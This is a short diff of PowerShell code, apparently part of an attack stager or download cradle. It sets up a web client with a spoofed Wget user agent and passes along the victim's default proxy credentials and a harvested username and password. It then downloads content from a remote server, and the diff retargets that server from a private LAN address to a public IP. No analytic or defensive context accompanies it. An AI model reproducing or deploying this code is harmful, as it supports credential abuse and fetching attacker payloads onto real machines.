@@ -4,4 +4,4 @@ $wc.Headers.Add("User-Agent","Wget/1.9+cvs-stable (Red Hat modified)");
 $wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
 $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
 $wc.credentials = new-object system.net.networkcredential($cred.username, $cred.getnetworkcredential().password, '');
-$result = $wc.downloadstring('http://192.168.1.104');
+$result = $wc.downloadstring('http://193.253.115.56');
